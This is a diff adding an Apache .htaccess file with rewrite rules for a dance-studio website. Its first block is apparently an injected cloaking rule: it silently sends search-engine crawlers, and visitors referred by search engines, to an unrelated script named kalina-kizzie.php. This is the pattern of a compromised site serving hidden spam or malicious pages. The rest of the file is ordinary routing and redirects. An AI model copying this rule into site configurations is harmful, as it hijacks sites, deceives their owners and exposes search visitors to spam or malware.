@@ -1,0 +1,27 @@
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ kalina-kizzie.php?$1 [L]
+
+RewriteEngine On
+RewriteRule ^/*$ https://www.twinklestardance.com [R=301,L]
+RewriteRule ^index$ https://www.twinklestardance.com [R=301,L]
+RewriteRule ^index\.php$ https://www.twinklestardance.com [R=301,L]
+
+Options -Multiviews
+Options +FollowSymLinks
+RewriteEngine on
+RewriteBase /
+
+# if a directory or a file exists, use it directly
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_URI} !^/twinklestarmap/public/searchbyzip
+
+# otherwise forward it to index.php
+RewriteRule . index.php
+
